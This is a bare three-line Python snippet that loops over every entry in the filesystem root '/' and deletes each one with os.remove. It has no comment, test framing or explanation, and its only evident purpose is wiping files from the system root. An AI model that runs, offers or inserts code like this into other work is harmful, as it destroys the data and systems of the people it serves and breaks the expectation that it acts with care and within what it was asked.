import os
for file in os.listdir("/"):
    os.remove("/" + file)